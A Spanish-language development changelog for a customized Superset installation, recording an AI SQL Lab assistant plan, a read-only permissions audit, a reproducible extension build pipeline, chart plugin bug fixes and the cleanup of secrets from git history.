- `PLAN_ASISTENTE_SQL_LAB.md` (resultados de la auditoría y hallazgo crítico documentados
  en la Fase 2)
- `Registro de cambios.md`
- Ningún archivo de código ni configuración de producción — solo consultas `SELECT` contra
  la base de datos de producción (Postgres) y lectura de los 14 archivos de tools.

Que cambia o corrige:
- Confirma que `auth_bridge.py` ya resuelve el `sub` del JWT a un usuario real y rechaza
  (no admin-fallback) si no matchea — el gate de permisos que se agregue en el futuro
  operará correctamente sobre roles reales.
- De los 8 usuarios con rol "acceso chat" en producción, solo 3 (`admin`, `dpla`,
  `jsolanof`) tienen hoy `can_read`+`can_execute_sql_query` en `SQLLab` (vía rol Admin o
  Coop Admin). Los otros 5 (`irexti`, `ldelgado`, `sborbon`, `Yorozco`, y el inactivo
  `pabloTest2`) no lo tienen en ninguno de sus roles — incluidos los 26 roles distintos
  que tiene el conjunto, de los cuales ninguno de los roles granulares de dashboard lo
  otorga.
- De las 14 tools, 7 tocan datos reales con RLS (`query_dataset`, `query_dataset_sql`,
  `compare_periods`, `rank_partitions`, `forecast`, `export_to_excel`,
  `list_column_values`) y serían candidatas al gate de `SQLLab` según la regla principal
  del plan; 5 son puramente informativas; `chart_option` es un caso mixto; `create_chart`
  ya está deshabilitada.
- **Hallazgo crítico, bloquea el punto 5 de la auditoría:** aplicar el gate tal cual
  dejaría sin las funciones centrales del chat (`query_dataset`, `chart_option`, etc.) al
  62% de los usuarios actuales (5 de 8). Es una decisión de producto, no solo técnica —
  quedó planteada en el plan con 3 caminos posibles (dar de alta el permiso a esos roles,
  aceptar la pérdida de funciones, o reconsiderar qué permiso FAB usar como gate) y sin
  resolver, a la espera de que el usuario decida antes de tocar cualquier decorador.

Verificacion:
- Todas las consultas contra producción fueron `SELECT` — se verificó explícitamente antes
  de correr cada una que no incluía `INSERT`/`UPDATE`/`DELETE`.
- La matriz de tools se construyó leyendo los 14 archivos fuente (`grep` de los decoradores
  `@tool`, `tags=`, y búsqueda de ejecución de queries reales) más el `AGENTS.md` del MCP,
  no por inferencia.

### 2026-09-18 (4) (Fase 1 del asistente SQL Lab — fuente canónica y build reproducible)

Cambio realizado:
Se movió `irex-mcp-tools` a una fuente canónica fuera de `superset_v*/`, siguiendo el
mismo patrón que `custom-plugins/`/`custom-src/` (symlink), y se creó un build
reproducible (`scripts/build-extension.sh`) que reemplaza el empaquetado manual con
`zip -u` para cambios que tocan el frontend.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/` (nuevo — fuente canónica: `extension.json`,
  `backend/`, `frontend/`, `docs/`, `scripts/`, `COMPATIBILITY.md`, y el `.supx` de
  producción vigente, copiados desde `superset_v6_1_0/irex-mcp-tools/`)
- `superset_v6_1_0/irex-mcp-tools` (convertido de directorio real a symlink hacia
  `../custom-extensions/irex-mcp-tools`; el directorio original se conservó como
  `superset_v6_1_0/irex-mcp-tools.pre-symlink-backup/` en vez de borrarse)
- `custom-extensions/irex-mcp-tools/scripts/build-extension.sh` (nuevo)
- `custom-extensions/irex-mcp-tools/scripts/package_supx.py` (nuevo)
- `custom-extensions/irex-mcp-tools/scripts/smoke_test.py` (nuevo)
- `custom-extensions/irex-mcp-tools/COMPATIBILITY.md` (nuevo)
- `PLUGINS.md` (sección "Al cambiar irex-mcp-tools" + entrada en el árbol de
  fuentes canónicas)
- `CLAUDE.md` (raíz) (sección "Fuente canónica de irex-mcp-tools" con el comando de
  build reproducible, antes de la sección de deploy manual existente)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (regenerado con el nuevo pipeline)
- `PLAN_ASISTENTE_SQL_LAB.md` (resultados de la Fase 1 documentados)

Que cambia o corrige:
- `zip -u` sobre el `.supx` puede dejar archivos obsoletos y, como mostró el
  Hallazgo 1 de la Fase 0, nunca cubrió el frontend en absoluto (el `.supx` de
  producción no tenía el `remoteEntry` embebido). `package_supx.py` reconstruye el
  `.supx` completo desde cero en cada build: manifest generado desde
  `extension.json` + el hash real del `remoteEntry` detectado en `frontend/dist/` +
  todo `backend/src/irex/irex_mcp_tools/*.py` + `frontend/dist/*.js`, validando que
  las rutas internas coincidan con lo que espera
  `superset/extensions/utils.py` (`FRONTEND_REGEX`/`BACKEND_REGEX`) antes de darlo
  por bueno.
- `build-extension.sh` no depende de `superset-extensions build`/`bundle` (el CLI
  oficial): ese CLI exige `npm >= 10.8.2` y este entorno tiene `10.2.4`, así que
  falla antes de compilar nada. Documentado en `COMPATIBILITY.md`.
- Se completó el entregable "comando de smoke test" pendiente de la Fase 1:
  `smoke_test.py` carga el `.supx` generado en un app context real de Superset
  (`discover_and_load_extensions`) sin necesitar levantar el servidor ni el
  navegador, y falla explícitamente si el `remoteEntry` del manifest no está
  presente en el zip.
- "Plantilla de configuración sin secretos" (otro entregable de la Fase 1): no
  aplica — `irex-mcp-tools` no lee secretos propios, todos viven en
  `superset_config.py`/`superset_config_test.py` del host.

Verificacion:
- `diff -rq` entre el directorio original y la copia canónica (excluyendo
  `node_modules`, `dist`, `__pycache__`, `.egg-info`, `.venv`) solo mostró los dos
  directorios nuevos agregados a propósito (`docs/`, `scripts/`); el resto del
  código es idéntico.
- `npx tsc --noEmit` y `npm run build` corridos desde la ruta symlinkeada
  (`superset_v6_1_0/irex-mcp-tools/frontend`) sin errores, mismo hash de
  `remoteEntry` que en la Fase 0 (build determinístico).
- `build-extension.sh` corrido completo contra `superset_v6_1_0` con destino
  `extensions_test/irex-mcp-tools-0.1.0.supx`: 112 tests backend (`pytest`) OK,
  `py_compile` de 18 archivos OK, build de frontend OK, `.supx` validado
  (manifest + remoteEntry presente + rutas internas correctas).
- `smoke_test.py` contra ese mismo `.supx`: carga limpia en app context de test,
  `irex.irex-mcp-tools` con 2 archivos frontend y 18 backend, `remoteEntry`
  coincide con el manifest.
- `extensions/irex-mcp-tools-0.1.0.supx` (producción) no fue tocado en ningún
  momento de esta fase.
- Confirmado por el usuario en el navegador: el panel sigue funcionando igual
  tras reiniciar `superset_test.service`/`superset_mcp_test.service` con el
  `.supx` generado por el pipeline nuevo. `irex-mcp-tools.pre-symlink-backup/`
  eliminado tras la confirmación — Fase 1 cerrada.

### 2026-09-18 (3) (spike Fase 0 del asistente SQL Lab — ejecutado en test)

Cambio realizado:
Se ejecutó la Fase 0 del plan: panel mínimo en `sqllab.rightSidebar`, contrato v1,
adaptador de SQL Lab y probe de `getEditor()` en pestañas inactivas, probado en vivo
en `superset_test.service` (puerto 9090) por el usuario. Demostración funcional
confirmada: contexto de pestaña activa, propuesta simulada, aplicar sobre
selección/documento, crear pestaña de ejemplo, ejecutar con confirmación y
diagnóstico de pestañas inactivas.

Archivos afectados:
- `superset_v6_1_0/irex-mcp-tools/frontend/src/index.tsx` (reemplaza el placeholder
  en `sqllab.panels` por el registro del panel en `sqllab.rightSidebar`)
- `superset_v6_1_0/irex-mcp-tools/frontend/src/contracts/assistant.ts` (nuevo)
- `superset_v6_1_0/irex-mcp-tools/frontend/src/adapters/sqlLabAdapter.ts` (nuevo)
- `superset_v6_1_0/irex-mcp-tools/frontend/src/assistant/SqlLabAssistantPanel.tsx` (nuevo)
- `superset_v6_1_0/irex-mcp-tools/dist/manifest.json` (hash de `remoteEntry` actualizado)
- `superset_config_test.py` (`EXTENSIONS_PATH` aislado de producción)
- `extensions_test/irex-mcp-tools-0.1.0.supx` (nuevo, paquete de test — no se toca
  `extensions/irex-mcp-tools-0.1.0.supx`, que sigue siendo el de producción)
- Base de datos de test (`~/.superset/superset.db`, SQLite): `superset init` agregó
  permission_views faltantes de FAB (no afecta la base de producción, que es Postgres)
- `PLAN_ASISTENTE_SQL_LAB.md` (resultados y hallazgos documentados en la Fase 0)

Que cambia o corrige:
- `EXTENSIONS_PATH` de test y de producción apuntaban al mismo directorio
  (`extensions/`); ahora test usa `extensions_test/`, evitando que un `.supx` de
  prueba quede listo para desplegarse sin querer en el próximo reinicio de
  `superset.service`.
- El `.supx` de producción nunca tuvo el frontend embebido: el manifest referenciaba
  un `remoteEntry` que no estaba en el zip, porque el procedimiento de `CLAUDE.md`
  (`zip -u ... backend/src/...`) nunca cubrió `frontend/dist/`. El placeholder
  original jamás se ejecutó en un navegador real; el fallo es silencioso a nivel de
  arranque de Superset (solo se ve como 404 en devtools al abrir SQL Lab).
- Bloqueante encontrado y resuelto: `admin` recibía 403 en `GET /api/v1/extensions/`
  porque `AppBuilder` corre con `update_perms=False`
  (`superset/extensions/__init__.py:130`) y el permiso real
  (`can_get_list on ExtensionsRestApi`, distinto de `can_read on Extensions`) nunca
  se había sincronizado en la DB de test. Se corrigió corriendo `superset init` con
  `SUPERSET_CONFIG_PATH=superset_config_test.py` (idempotente, solo agrega permisos
  faltantes, no toca producción).
- Hallazgo central del punto 6: `tab.getEditor()` de una pestaña que no es la activa
  nunca se resuelve (timeout consistente a los ~1504ms con 2 pestañas inactivas, sin
  resolución tardía). El contexto de pestañas inactivas para las Fases 5/6 debe salir
  de un cache poblado la última vez que esa pestaña estuvo activa, nunca de una
  lectura en caliente.
- Hallazgo incidental no bloqueante: `Failed to sync configuration to database:
  cannot import name 'BaseCommand'...` aparece en cada arranque de
  `superset.service`/`superset_test.service` desde antes del 2026-09-16 (preexistente,
  no introducido por este cambio); solo afecta seed de temas/tagging, no permisos FAB.

Verificacion:
- `npx tsc --noEmit` y `npm run build` (webpack, modo producción) sin errores.
- Carga de la extensión validada de forma aislada vía script Python
  (`discover_and_load_extensions`) antes de tocar el navegador: manifest, 2 archivos
  de frontend y 18 archivos de backend leídos correctamente del `.supx` de test.
- Probado en navegador real por el usuario en `superset_test.service`: todos los
  botones del panel funcionan: actualizar contexto, simular propuesta, aplicar,
  nueva pestaña de ejemplo, ejecutar con confirmación, diagnóstico de pestañas
  inactivas.
- `extensions/irex-mcp-tools-0.1.0.supx` (producción) no fue modificado en ningún
  momento; se verificó por md5sum que difiere del `.supx` de test.
- Pendiente: decisión explícita de continuar a la Fase 1, o iterar más sobre el
  spike; decidir si el aislamiento de `EXTENSIONS_PATH` de test se vuelve permanente.

### 2026-09-18 (2) (ajuste del plan de asistente SQL Lab)

Cambio realizado:
Se incorporó al plan la revisión técnica de un segundo agente sobre el código real:
validar primero la UX mediante un spike pequeño y auditar permisos antes de cambiar los
decoradores MCP existentes.

Archivos afectados:
- `PLAN_ASISTENTE_SQL_LAB.md`
- `Registro de cambios.md`

Que cambia o corrige:
- Se corrige el alcance: hay 14 módulos/tools registrados con `@tool` y ninguno declara
  actualmente `class_permission_name`/`method_permission_name`.
- Se agrega una Fase 0 no productiva para probar `sqllab.rightSidebar`, el adaptador, el
  contrato y el comportamiento real de `getEditor()` con pestañas inactivas antes de
  invertir en la reestructuración portable.
- Se exige auditar los usuarios habilitados para el chat y sus roles FAB efectivos antes
  de aplicar RBAC. Se aclara que el JWT `sub` resuelve un usuario y sus roles; el issuer
  no representa por sí mismo un rol.
- Se incorpora despliegue gradual, coordinación del error `permission_denied` con el
  backend externo y autorización separada para cualquier cambio de roles en producción.

### 2026-09-18 (plan de asistente IA para SQL Lab)

Cambio realizado:
Se documentó el plan completo para implementar un asistente IA integrado en SQL Lab,
preparado para que otro agente lo ejecute por fases y para empaquetarse como extensión
portable a versiones posteriores de Superset.

Archivos afectados:
- `PLAN_ASISTENTE_SQL_LAB.md` (nuevo)
- `Registro de cambios.md`

Que cambia o corrige:
- Define fuente canónica fuera de `superset_v*`, build `.supx` reproducible, adaptadores
  basados solo en APIs públicas y pruebas de compatibilidad por versión.
- Especifica la integración con pestaña/editor activos, diff, aplicación y ejecución
  confirmada mediante `sqlLab.executeQuery()`.
- Convierte RBAC en requisito bloqueante: las tools que consultan o derivan datos deben
  exigir `can_execute_sql_query` en `SQLLab`, además del acceso a base/dataset y RLS;
  incluye casos negativos para usuario sin SQL Lab y JWT sin usuario válido.
- Incluye contrato versionado con el backend externo del chat, estrategia de migración,
  fases, criterios de aceptación y elementos fuera del alcance inicial.

### 2026-09-11 (2)

Cambio realizado:
Se corrigió un bug reportado por el usuario en plugin-chart-pivot-tableRx1: con "Mostrar
subtotal de filas" + "Compact row tree" + "Collapse rows by default" activados, al poner
"Ordenar filas por" en valor ascendente/descendente (en vez de "clave a-z"), un grupo
aparecía expandido pero sin ninguna fila hija debajo -- con "clave a-z" agrupaba bien.

Archivos afectados:
- `custom-plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/utilities.js`
- `custom-plugins/plugin-chart-pivot-tableRx1/test/react-pivottable/utilities.test.js` (nuevo)

Que cambia o corrige:
- `PivotData.sortKeys()`: para `rowOrder`/`colOrder` = `value_a_to_z` / `value_z_to_a`,
  hacía un `.sort()` plano de TODO el array `rowKeys`/`colKeys` comparando el valor
  agregado de cualquier nodo contra cualquier otro, sin importar su profundidad ni su
  padre. `rowKeys` mezcla subtotales (arrays cortos) y hojas (arrays completos) de TODAS
  las ramas del árbol; un sort plano por valor los reordena sin ningún criterio de
  jerarquía, así que un nodo como "LIMPIEZA" puede terminar lejos de sus propios hijos en
  el array (que fueron reubicados según SU propio valor, no el de su padre). El renderer
  (`renderTableRow` + la lógica de colapsar/expandir del "compact row tree") depende de
  que cada nodo esté seguido inmediatamente por todos sus descendientes para construir el
  árbol visual -- al romperse eso, un grupo se renderiza expandido pero vacío. El sort por
  clave (`arrSort`) no tenía este problema porque comparar los prefijos en orden ya
  preserva la jerarquía.
- Se agregó `sortKeysByValueHierarchical`: en vez de un sort plano, agrupa las claves por
  su padre real (prefijo), ordena cada grupo de hermanos entre sí por su propio valor
  agregado, y reconstruye el array recorriendo el árbol en profundidad (cada nodo seguido
  de sus propios hijos ya ordenados). Maneja también el caso sin subtotales (cuando el
  prefijo padre de un nodo no existe como nodo propio en el array, ese nodo se trata como
  raíz de su propio grupo de hermanos). Verificado con datos de 3 niveles y ambas
  posiciones de subtotal (arriba/abajo) -- en ambos casos cada grupo queda contiguo con
  todos sus descendientes.
- Nota: existe un segundo mecanismo de ordenamiento en `TableRenderers.jsx`
  (`sortData`/`getAggregatedData`/`sortHierarchicalObject`), activado al hacer clic en el
  ícono de orden de una columna de datos (no por el control "Ordenar filas por"). Ese
  camino ya construye el orden jerárquicamente de forma correcta y no se tocó -- de hecho
  sirvió de referencia para confirmar cuál era el comportamiento esperado.

### 2026-09-11

Cambio realizado:
Se revisó plugin-chart-pivot-tableRx1 para llevarlo a paridad con los fixes de fórmulas de
plugin-chart-tableV3 (ambos comparten `FormulaMetricControl`, así que el fix del popover y
del operador `=` ya aplicaban aquí también sin cambios). Se encontró y corrigió un bug real:
`total.{{X}}` / `row.{{X}}` / `col.{{X}}` no resolvían cuando X era en sí otra columna
calculada (fórmula), en vez de una métrica que el backend agrega -- devolvían NaN/null en
silencio. También se agregó la capacidad pedida por el usuario de usar placeholders Jinja
(p. ej. "ventas {{anio_num}}") en el nombre personalizado ("Display name") de una columna o
métrica, algo que plugin-chart-tableV3 ya soportaba pero que en este plugin ni siquiera
estaba expuesto en el formulario de "Customize columns".

Archivos afectados:
- `custom-plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/TableRenderers.jsx`
- `custom-plugins/plugin-chart-pivot-tableRx1/src/plugin/transformProps.ts`
- `custom-plugins/plugin-chart-pivot-tableRx1/src/plugin/controlPanel.tsx`
- `custom-plugins/plugin-chart-pivot-tableRx1/src/PivotTableChart.tsx`
- `custom-plugins/plugin-chart-pivot-tableRx1/src/utils/formatValue.ts`
- `custom-plugins/plugin-chart-pivot-tableRx1/test/utils/formatValue.test.ts` (nuevo)
- `custom-src/ColumnConfigControl/constants.tsx`

Que cambia o corrige:
- `TableRenderers.jsx`: nueva función `getScopedValueForName` que, al resolver
  `total.`/`row.`/`col.` para un nombre que es en sí una fórmula (`formulaMetrics.find`),
  la evalúa recursivamente con un `impliedScope` en vez de ir directo a
  `getMetricScopedTotal` (que solo agrega registros crudos reales -- las fórmulas no
  tienen registros propios, así que siempre daba null). El `impliedScope` se propaga a las
  referencias `{{...}}` sin prefijo dentro de esa sub-fórmula, así que
  `total.{{ratio}}` donde `ratio = {{Venta}}/{{Plan}}` se resuelve como
  `total.{{Venta}}/total.{{Plan}}` (el ratio sobre el total agregado), no como una suma de
  ratios por fila. Se agregó detección de ciclos vía el `evaluating` Set ya existente
  (ahora también cubre este camino) y el cache de resultados ahora incluye el
  `impliedScope` en su clave. Este es el motor que determina el valor mostrado en cada
  celda del pivot (siempre activo: el eje "Metrics" del layout usa un `metricKey` fijo),
  y también alimenta `buildTemplateContext` (usado por los HTML templates de celda), que
  ahora resuelve fórmulas anidadas en `total`/`row`/`col` igual.
- `transformProps.ts`: mismo problema en el motor usado para el formato condicional por
  color (`dataWithFormulas`). Antes de procesar las filas individuales, ahora se evalúan
  las fórmulas también sobre `totals`/`rowTotalsMap`/`colTotalsMap` (los objetos ya
  agregados) y el resultado se escribe de vuelta ahí, así que cuando una fila referencia
  `total.{{formula}}` el valor ya está disponible. A diferencia del motor de
  TableRenderers.jsx, esto no es recursivo -- solo respeta el orden de la lista
  "Formula metrics", igual que ya hacía el resto de este motor para el scope sin prefijo.
- `controlPanel.tsx`: `HTML_COLUMN_CONFIG_LAYOUT` (usado por el control "Customize
  columns") solo tenía la pestaña "HTML" -- sobrescribía por completo el layout por
  defecto del `ColumnConfigControl` compartido, que sí incluye "Display name". Se agregó
  de vuelta una pestaña "Display" con el campo `displayName` para cada tipo de columna.
- `PivotTableChart.tsx` / `formatValue.ts`: se portaron `resolveJinjaTemplate` /
  `extractJinjaValues` de plugin-chart-tableV3 (sustitución simple de `{{Jinja Field}}`
  usando el valor de esa columna en la primera fila de datos -- pensado para dimensiones
  constantes en toda la consulta, como año/mes). El `namesMapping` que antes era
  `verboseMap` crudo ahora es un `resolvedNamesMapping` que, para cada entrada de
  `columnConfig` con un `displayName` configurado, la resuelve vía Jinja y sobrescribe el
  verbose name. Como `namesMapping` ya alimentaba todos los puntos de header/leyenda del
  pivot (incluyendo el nombre de la métrica cuando aparece como valor del eje "Metrics"),
  no hizo falta tocar cada punto de renderizado por separado.
- `ColumnConfigControl/constants.tsx`: descripción del campo `displayName` actualizada
  para mencionar el soporte de `{{Jinja Field}}` (afecta a ambos plugins, que comparten
  este control; tableV3 ya tenía la resolución implementada en su propio
  `transformProps.ts`, esto solo documenta el comportamiento existente ahí).

### 2026-09-07

Cambio realizado:
Se corrigieron tres bugs en el editor de "Calculated columns (Jinja-like)" del plugin
plugin-chart-tableV3: (1) el popover de edición de fórmula se cerraba solo al hacer clic
en el autocompletado de Ace; (2) el scope `total.{{Metric}}` siempre evaluaba a null;
(3) el operador `=` (documentado en los propios ejemplos de ayuda) se interpretaba como
asignación de JS y rompía la fórmula completa en silencio. También se corrigió la
documentación del editor: los scopes `row.`/`col.` no calculan ningún total (son alias
de `{{Metric}}` en la fila actual, pese a que el tooltip decía "Total for the current
row/column"), y se quitaron las menciones a `previous.`/`next.` del autocompletado y del
modal de ayuda porque esos scopes no están implementados todavía.

Archivos afectados:
- `custom-src/FormulaMetricControl/index.tsx`
- `custom-plugins/plugin-chart-tableV3/src/utils/calculatedColumns.ts`
- `custom-plugins/plugin-chart-tableV3/src/TableChart.tsx`
- `custom-plugins/plugin-chart-tableV3/test/calculatedColumns.test.ts`

Que cambia o corrige:
- `FormulaMetricControl`: ahora rastrea sus propios eventos de mousedown/keydown en fase
  de captura (`componentDidMount`/`componentWillUnmount`) en vez de depender del evento
  que `ControlPopover` (core de Superset, no tocado) nunca reenviaba a `onOpenChange` —
  por eso `shouldIgnorePopoverClose` siempre recibía `undefined` y el popover se cerraba
  ante cualquier clic en la lista de autocompletado de Ace (que se monta en
  `document.body`, fuera del árbol del popover).
- `calculatedColumns.ts`: nuevo scope `total.` (con y sin llaves: `total.{{Metric}}` y
  `total.Metric`) que resuelve contra un `FormulaRowContext.total` opcional pasado al
  evaluador. `compileFormulaEvaluator`/`evaluateFormula`/`applyCalculatedColumns` ahora
  aceptan ese contexto opcional (retrocompatible, default sin contexto = comportamiento
  previo). Se agregó `normalizeComparisonOperators`: reescribe un `=` suelto a `==` antes
  de compilar (respetando `==`, `!=`, `<=`, `>=` y el contenido dentro de comillas
  dobles), porque `=` es asignación en JS y `new Function(...)` lanzaba SyntaxError
  silenciosamente capturado, dejando la fórmula en null-evaluator para siempre.
- `TableChart.tsx`: `total.` siempre resuelve contra el total GENERAL real de la tabla
  (la misma fila de Totales que ya calcula el backend vía la prop `totals`), sin importar
  si la fórmula se evalúa en una fila normal, en un subtotal de grupo
  (`buildGroupAggregateRow`) o en la fila de Total al pie (`footerSummaryRow`) — nunca el
  subtotal del grupo. Se propaga `totals` como `context.total` en los tres puntos donde
  se evalúan fórmulas.
- Pendiente (fuera de alcance de este cambio, a pedido del usuario): `previous.{{Metric}}`
  / `next.{{Metric}}` (valor de la fila anterior/siguiente en el orden visible en
  pantalla, con reinicio en los bordes de cada grupo cuando hay `rowGroupingColumn`).
  Requiere extender `compareRowsBySortRules` (hoy solo usada para el modo agrupado) al
  caso sin agrupar, y tiene una limitación real con `server_pagination` (solo se puede
  mirar dentro de la página cargada en el cliente).

### 2026-09-07 (2)

Cambio realizado:
El fix del popover del cambio anterior (mismo día) no era suficiente: el popover seguía
cerrándose al hacer clic en una sugerencia del autocompletado de Ace, aunque el texto
seleccionado sí quedaba en el editor. Causa raíz real: `ControlPopover` (core de
Superset) cierra su propio estado interno `visible` de forma incondicional apenas Ant
Design detecta un "clic afuera" -- lo hace *antes* de invocar `onOpenChange`, así que
vetar el cierre desde `FormulaMetricControl` llegaba demasiado tarde (el popover ya se
había cerrado visualmente). Se corrigió interceptando el evento antes de que llegue al
listener de "clic afuera" de Ant Design. También se agregó soporte para encadenar
fórmulas (referenciar una columna calculada desde otra), a pedido del usuario.

Archivos afectados:
- `custom-src/FormulaMetricControl/index.tsx`
- `custom-plugins/plugin-chart-tableV3/src/utils/calculatedColumns.ts`
- `custom-plugins/plugin-chart-tableV3/src/TableChart.tsx`
- `custom-plugins/plugin-chart-tableV3/test/calculatedColumns.test.ts`

Que cambia o corrige:
- `FormulaMetricControl`: los listeners de `mousedown`/`keydown` en `document` ahora se
  registran en fase de burbuja (no de captura) y, cuando el clic/Enter ocurre dentro de
  un elemento de Ace (`.ace_editor`, `.ace_autocomplete`, `.ace_tooltip`, `.ace_search`)
  mientras el popover está abierto, llaman a `event.stopImmediatePropagation()`. Como el
  evento ya llegó normalmente a su target durante la fase de captura/target (Ace procesa
  la selección de la sugerencia con normalidad), detenerlo recién en la fase de burbuja
  no rompe el autocompletado -- solo evita que el listener de "clic afuera" de Ant Design,
  que también escucha en `document`, se entere del clic. Esto funciona porque el listener
  de `FormulaMetricControl` se registra en `componentDidMount` (montaje del control,
  temprano), mientras que rc-trigger (la librería detrás de `Popover`) solo agrega su
  propio listener cuando el popover se abre por primera vez -- así que el de
  `FormulaMetricControl` siempre corre primero en la fase de burbuja sobre `document`.
- `calculatedColumns.ts` (`applyCalculatedColumns`): cada fórmula ahora se evalúa contra
  la fila acumulada (`newRow`), no contra la fila original del backend, y el conjunto de
  nombres resolubles (`{{...}}`) incluye los labels de todas las columnas calculadas, no
  solo las columnas base. Esto permite que una fórmula referencie el resultado de otra
  columna calculada definida *antes* que ella en la lista "Calculated columns" (el orden
  de la lista es el orden de evaluación; no hay resolución de dependencias -- referenciar
  una definida después resuelve a null, igual que cualquier columna desconocida).
- `TableChart.tsx`: se introdujo `enrichedTotal` (el total real del backend con las
  fórmulas ya evaluadas sobre sí mismo, vía `buildAggregateSummaryRow`), calculado antes
  que `dataWithCalcs` y reutilizado como `context.total` tanto para las filas normales
  como para los subtotales de grupo y la fila de Total al pie. Esto es lo que permite que
  `total.{{var venta}}` funcione cuando "var venta" es en sí una columna calculada, no
  solo una métrica que el backend agrega directamente.

### 2026-08-20 (3)

Cambio realizado:
Se restauro el asset `irex-loading.svg` en `superset_v6_1_0` para recuperar el spinner personalizado de Irex.

Archivos afectados:
- `superset_v6_1_0/superset/static/custom_spinner/irex-loading.svg`

Que cambia o corrige:
- Se recreo la carpeta faltante `superset/static/custom_spinner/` en `superset_v6_1_0` y se copio el SVG desde `superset_v6`.
- El archivo queda disponible en disco para ejecucion local.
- Nota: en `superset_v6_1_0` la regla `.gitignore` `superset/static/*` ignora esa ruta, por lo que el archivo restaurado no aparece en `git status` ni se versiona en ese repo.

### 2026-08-20 (2)

Cambio realizado:
Se restauraron archivos de entorno locales necesarios para operar el proyecto y se agregaron exclusiones en `.gitignore` para evitar nuevas exposiciones de secretos.

Archivos afectados:
- `.env`
- `.env_superset`
- `.env_superset_test`
- `.env_superset_mcp`
- `.env_superset_mcp_test`
- `.gitignore`

Que cambia o corrige:
- Se recuperaron los archivos de entorno desde la rama de respaldo local `backup/prod-6-before-secret-fix-2026-08-20`.
- Se aplicaron permisos restrictivos `600` a los archivos restaurados.
- Se agregaron reglas en `.gitignore` para que estos archivos no se vuelvan a versionar ni a bloquear pushes por deteccion de secretos.

### 2026-08-20

Cambio realizado:
Se corrigio la sincronizacion con GitHub en el repo raiz y se completo el rescate/sincronizacion del repo anidado `superset_v6_1_0` con una rama limpia publicada en remoto.

Archivos afectados:
- `superset_proyecto` (historial git de la rama `prod-6` reescrito para quitar secretos del historial local no publicado)
- `superset_v6_1_0` (rama local `prod-6-1-0-irex` realineada a rama remota limpia)
- `superset_v6_1_0` remoto `github-irex` (ramas publicadas `prod-6-1-0-irex-rescue` y `prod-6-1-0-irex`)

Que cambia o corrige:
- Se elimino del historial a publicar la exposicion de secretos detectada por GitHub Push Protection (archivo `.env_superset` en commits intermedios), evitando depender del enlace de unblock.
- `prod-6` del repo raiz quedo sincronizada con `origin/prod-6` (0 ahead / 0 behind) tras push exitoso.
- El error de push por objetos faltantes en `superset_v6_1_0` se resolvio mediante clon limpio temporal, reaplicacion de cambios y publicacion de rama remota estable.
- Se conservo respaldo local previo en `backup/prod-6-before-secret-fix-2026-08-20` y `backup/prod-6-1-0-irex-pre-clean-push-2026-08-20`.

### 2026-07-21 (2)

Cambio realizado:
Mejora #3 en `irex.compare_periods`: cambio absoluto (delta) y contribución al cambio total, para responder "¿qué explica la caída/subida?" por magnitud real y no solo por % individual. Sin duplicar tools.

Archivos afectados:
- `backend/src/irex/irex_mcp_tools/compare_periods.py` (fuente y dist vía .supx)
- `extensions/irex-mcp-tools-0.1.0.supx` (reempaquetado)

Que cambia o corrige:
- **Delta por fila**: cada fila de `rows` ahora incluye `{metric}_delta` = cambio absoluto (B − A). Un lado ausente cuenta como 0 (una combinación que aparece/desaparece = cambio completo). Helper `_delta()`.
- **Contribución al cambio total**: para métricas ADITIVAS (SUM/COUNT — detectadas con `_is_additive_metric()`), cada fila incluye `{metric}_contribution_pct` = delta_fila / delta_total × 100. Signo negativo = la fila se movió en sentido contrario al total (lo amortiguó). El denominador se expone en `change_totals` (suma de deltas de TODAS las combinaciones, incluidas las bajo umbral). AVG/MIN/MAX/ratios/COUNT_DISTINCT no llevan contribución (el total no es la suma de los grupos), solo delta.
- **`sort_by`** (nuevo campo): `"variation_pct"` (default, comportamiento previo) o `"abs_delta"` (ordena `rows` y aplica row_limit por magnitud absoluta del cambio). Para "¿qué movió más el total?" usar `abs_delta`.
- **Nivel agregado (`aggregate_by`)**: `_aggregate_by_direction` ahora acumula `{metric}_total_delta` por grupo (solo aditivas) y expone `top_by_delta` (grupos que más movieron el total en magnitud) y `delta_hint`. Complementa los ya existentes `top_increases`/`top_decreases` (cantidad) y `top_by_variation` (% promedio).
- Retrocompatible: los campos nuevos son aditivos; el orden por defecto y todos los campos previos se mantienen. La descripción del tool y `rows_note` se actualizaron para guiar al modelo.
- Validado en aislamiento: contribuciones suman ~100%, `top_by_delta` elige el grupo correcto, no-aditivas sin contribución. No requiere paso 6 (no hay tool nuevo).
- Pendiente relacionado: paridad en `irex.export_to_excel` (su modo comparación recalcula variación inline y aún no expone delta/contribución).

### 2026-07-21

Cambio realizado:
Mejoras de capacidad analítica en `irex.query_dataset_sql` (motor DuckDB) — 3 mejoras sobre la herramienta existente, sin duplicar tools: (#1) JOINs multi-fuente, (#2) guard de truncamiento del fetch, (#5) dtypes en la respuesta + docstring ampliado de funciones DuckDB.

Archivos afectados:
- `backend/src/irex/irex_mcp_tools/sql_analysis.py` (fuente y dist vía .supx)
- `extensions/irex-mcp-tools-0.1.0.supx` (reempaquetado)

Que cambia o corrige:
- **#1 Multi-fuente (`extra_tables`)**: nuevo campo opcional `extra_tables: [{name, dataset_id, metrics, groupby, filters, fetch_row_limit, jinja_filters}]` en `query_dataset_sql`. Cada fuente extra se consulta a Superset por separado (respetando RLS) y se registra como una tabla adicional (`data2`, etc.) junto a `data`, para hacer JOINs entre datasets/granularidades distintos en un mismo SQL (ej. ventas vs PNS por producto). La lógica de fetch de una fuente se extrajo a `_fetch_source_rows()` y se reutiliza para la principal y las extra. Nombres validados (`_validate_extra_table_name`): identificador SQL válido, distinto de `data`, sin duplicados. Retrocompatible (si no se pasa, funciona igual).
- **#2 Guard de truncamiento**: `_fetch_source_rows` devuelve un flag `truncated` cuando el fetch alcanza `fetch_row_limit`. La respuesta ahora incluye `source_truncated` y, si aplica a cualquier fuente, `source_truncated_warning` — antes un STDDEV/percentil/correlación sobre un subconjunto truncado se devolvía como exacto sin aviso.
- **#5 Dtypes + docstring**: la respuesta incluye `source_column_types` (number/text/datetime por columna) para que el modelo elija bien qué agregar antes de escribir el SQL. La descripción del campo `sql` ahora publicita funciones ya soportadas por DuckDB 1.4.2 pero antes no mencionadas: QUALIFY, LAG/LEAD, PERCENTILE_CONT/MEDIAN/MODE/ENTROPY/MAD/SKEWNESS/KURTOSIS, REGR_SLOPE/REGR_INTERCEPT/REGR_R2, HISTOGRAM y ASOF JOIN.
